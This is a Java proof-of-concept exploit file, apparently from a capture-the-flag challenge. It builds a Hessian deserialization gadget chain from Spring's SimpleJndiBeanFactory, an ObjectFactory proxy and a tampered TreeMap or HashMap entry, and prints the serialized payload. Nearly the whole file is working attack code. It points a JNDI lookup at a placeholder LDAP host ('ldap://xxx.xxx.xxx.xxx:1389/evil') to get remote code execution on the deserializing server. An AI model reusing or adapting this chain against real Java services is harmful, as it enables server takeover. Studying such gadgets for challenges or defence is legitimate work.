

import com.rctf.server.tool.HessianFactory;
import com.rctf.server.tool.Maybe;
import org.springframework.beans.factory.ObjectFactory;
import org.springframework.beans.factory.config.ObjectFactoryCreatingFactoryBean;
import org.springframework.jndi.support.SimpleJndiBeanFactory;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.TreeMap;

public class Poc {
    public static void main(String[] args) throws Exception{
        SimpleJndiBeanFactory simpleJndiBeanFactory = new SimpleJndiBeanFactory();
        ObjectFactoryCreatingFactoryBean objectFactoryCreatingFactoryBean = new ObjectFactoryCreatingFactoryBean();
        // 设置父类的值：beanFactory
        Field beanFactory = Class.forName("org.springframework.beans.factory.config.AbstractFactoryBean").getDeclaredField("beanFactory");
        beanFactory.setAccessible(true);
        beanFactory.set(objectFactoryCreatingFactoryBean, simpleJndiBeanFactory);
        // 设置值：targetBeanName
        setFieldValue(objectFactoryCreatingFactoryBean, "targetBeanName", "ldap://xxx.xxx.xxx.xxx:1389/evil");
        //得到：targetBeanObjectFactory
        Method createInstance = objectFactoryCreatingFactoryBean.getClass().getDeclaredMethod("createInstance");
        createInstance.setAccessible(true);
        ObjectFactory<?> targetBeanObjectFactory = (ObjectFactory<?>) createInstance.invoke(objectFactoryCreatingFactoryBean);
        Constructor<?> declaredConstructor = Class.forName("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler").getDeclaredConstructor(ObjectFactory.class);
        declaredConstructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(targetBeanObjectFactory);

        Maybe maybeProxy = new Maybe(invocationHandler);
        TreeMap<Object, Object> treeMap = gadgetFromTreeMap(maybeProxy);

        String payload = HessianFactory.serialize(treeMap);
        System.out.println(payload);
//        HessianFactory.deserialize(payload);




    }


    public static void setFieldValue(Object object, String fieldName, Object value) throws Exception{
        Class<?> clazz = object.getClass();
        Field field = clazz.getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(object, value);
    }

    public static TreeMap<Object, Object> gadgetFromTreeMap(Object o) throws Exception {
        TreeMap<Object, Object> treeMap = new TreeMap<>();
        treeMap.put(1, 1);
        // 获取TreeMap的root节点
        Field rootField = TreeMap.class.getDeclaredField("root");
        rootField.setAccessible(true);
        Object rootEntry = rootField.get(treeMap);
        // 获取Entry的key字段
        Field keyField = rootEntry.getClass().getDeclaredField("key");
        keyField.setAccessible(true);
        // 修改key
        keyField.set(rootEntry, o);
        return treeMap;
    }
    public static HashMap<Object, Object> gadgetFromHashmap(Object o) throws Exception {
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(1,1);
        Field tableField = HashMap.class.getDeclaredField("table");
        tableField.setAccessible(true);
        Object[] table = (Object[]) tableField.get(hashMap);
        for (Object entry: table){
            if (entry != null){
                setFieldValue(entry,"key",o);
            }
        }
        return hashMap;
    }
}
